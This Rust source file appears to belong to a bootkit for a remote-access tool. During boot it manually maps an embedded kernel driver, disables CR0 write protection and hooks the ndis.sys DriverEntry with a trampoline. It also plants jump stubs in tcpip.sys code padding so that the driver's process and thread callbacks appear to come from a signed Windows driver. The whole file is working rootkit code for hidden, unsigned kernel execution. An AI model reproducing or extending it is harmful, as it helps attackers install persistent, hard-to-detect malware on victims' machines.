use core::arch::global_asm;
use core::ffi::CStr;
use core::{ptr, slice};

use log::{error, info, warn};
use rat_common::utils::get_function_code;
use rat_common::windows::kernel::{InstructionRecoveryInfo, KernelHandoff};
use rat_common::windows::utils::insert_jmp_trampoline;
use windows_sys::w;

use crate::utils;
use crate::utils::types::_LIST_ENTRY;
use crate::utils::{mapper, pe};

#[cfg(debug_assertions)]
const DRIVER: &[u8] =
    include_bytes!("../../../rat-driver/target/debug/rat_driver_package/rat_driver.sys");

#[cfg(not(debug_assertions))]
const DRIVER: &[u8] =
    include_bytes!("../../../rat-driver/target/release/rat_driver_package/rat_driver.sys");

const TARGET_OBJECT_CALLBACK_DRIVER: *const u16 = w!("tcpip.sys");
const TARGET_HOOKED_DRIVER: *const u16 = w!("ndis.sys");

global_asm!(
    ".global DriverEntryHooked_trampoline",
    "DriverEntryHooked_trampoline:",
    "movabs r8, 0",  // extra: *const KernelHandoff
    "movabs rax, 0", // Entrypoint of DRIVER
    "jmp rax",
    ".global DriverEntryHooked_trampoline_end",
    "DriverEntryHooked_trampoline_end:",
);

unsafe extern "win64" {
    fn DriverEntryHooked_trampoline();
    fn DriverEntryHooked_trampoline_end();
}

pub fn patch_ntoskrnl(
    _: &mut [u8],
    mut empty_buffer: &mut [u8],
    load_order_list_head: &_LIST_ENTRY,
) {
    info!("Patching ntoskrnl.exe...");

    if empty_buffer.is_empty() {
        warn!("No usuable buffer is provided. Some operations cannot be performed.");
        return;
    }

    let mapping = match unsafe { mapper::manual_map(DRIVER, load_order_list_head, empty_buffer) } {
        Some(mapping) => {
            info!(
                "Mapped kernel driver to allocated buffer, bytes on disk = {}, bytes in memory = 0x{:X} ({}), entrypoint offset = 0x{:X}",
                DRIVER.len(),
                mapping.size,
                mapping.size,
                mapping.entrypoint,
            );

            mapping
        }
        None => {
            error!("Cannot map kernel driver to allocated buffer");
            return;
        }
    };

    let (driver_image_base, e) = empty_buffer.split_at_mut(mapping.size);
    empty_buffer = e;

    let process_preop_trampoline = _insert_object_callback_trampoline(
        driver_image_base,
        c"ProcessPreopCallback",
        load_order_list_head,
    );
    let thread_preop_trampoline = _insert_object_callback_trampoline(
        driver_image_base,
        c"ThreadPreopCallback",
        load_order_list_head,
    );
    let process_notify_trampoline = _insert_object_callback_trampoline(
        driver_image_base,
        c"ProcessNotifyRoutine",
        load_order_list_head,
    );

    match unsafe { utils::get_boot_loaded_module(load_order_list_head, TARGET_HOOKED_DRIVER) } {
        Some(injected_driver) => {
            let entrypoint = injected_driver.kldr_entry.EntryPoint as *mut u8;
            info!("Patching target driver entrypoint at {entrypoint:p}");

            let trampoline = unsafe {
                get_function_code(
                    DriverEntryHooked_trampoline as *const u8,
                    DriverEntryHooked_trampoline_end as *const u8,
                )
            };

            let cr0 = utils::DisableWriteProtection::new();
            unsafe {
                let size = trampoline.len();
                let entrypoint = slice::from_raw_parts_mut(entrypoint, size);

                // Save original instructions to empty buffer
                empty_buffer[..size].copy_from_slice(entrypoint);

                // Construct KernelHandoff struct
                let handoff = KernelHandoff {
                    driver_entry: InstructionRecoveryInfo {
                        address: entrypoint.as_ptr() as *mut u8,
                        instructions: empty_buffer.as_ptr(),
                        instructions_len: size,
                    },
                    process_preop_trampoline,
                    thread_preop_trampoline,
                    process_notify_trampoline,
                };
                empty_buffer = &mut empty_buffer[size..];
                empty_buffer
                    .as_mut_ptr()
                    .cast::<KernelHandoff>()
                    .write_unaligned(handoff);

                // Patching imm64 addresses
                entrypoint.copy_from_slice(trampoline);
                entrypoint[2..10].copy_from_slice(&(empty_buffer.as_ptr() as u64).to_le_bytes());

                let driver_image_base = driver_image_base.as_ptr() as u64;
                entrypoint[12..20].copy_from_slice(
                    &driver_image_base
                        .saturating_add(u64::from(mapping.entrypoint))
                        .to_le_bytes(),
                );

                info!("DriverEntry hook installed: {entrypoint:02X?}");
            }
            drop(cr0);
        }
        None => {
            warn!("No injected driver provided. DriverEntry hook will not be installed.");
        }
    }
}

fn _insert_object_callback_trampoline(
    driver_image_base: &mut [u8],
    exported_routine: &CStr,
    load_order_list_head: &_LIST_ENTRY,
) -> *const u8 {
    match unsafe {
        utils::get_boot_loaded_module(load_order_list_head, TARGET_OBJECT_CALLBACK_DRIVER)
    } {
        Some(driver) => {
            let mut process_preop_callback = ptr::null();
            unsafe {
                pe::iterate_export_address_table_mut(
                    driver_image_base,
                    |our_name, our_function| {
                        if our_name == exported_routine {
                            process_preop_callback = our_function.as_ptr();
                        }
                    },
                );
            }

            if process_preop_callback.is_null() {
                warn!("Cannot find exported {exported_routine:?} in kernel driver");
                ptr::null()
            } else {
                let driver = unsafe {
                    slice::from_raw_parts_mut(
                        driver.kldr_entry.DllBase as *mut u8,
                        driver.kldr_entry.SizeOfImage as usize,
                    )
                };

                let mut trampoline = ptr::null();
                const TRAMPOLINE_INSERTABLE: &[u8] = &[0xCC; 12];
                unsafe {
                    pe::iterate_sections_mem_mut(driver, |header, section| {
                        if header.Name.starts_with(b".text")
                            && let Some(offset) =
                                utils::find_pattern(section, TRAMPOLINE_INSERTABLE)
                        {
                            let success = insert_jmp_trampoline(
                                &mut section[offset..],
                                process_preop_callback as u64,
                                None,
                                None,
                            );

                            if success {
                                trampoline = section[offset..].as_ptr();
                            }
                        }
                    });
                }

                if trampoline.is_null() {
                    warn!("Cannot find a suitable place for {exported_routine:?} trampoline");
                } else {
                    info!("{exported_routine:?} trampoline inserted at {trampoline:p}");
                }

                trampoline
            }
        }
        None => ptr::null(),
    }
}
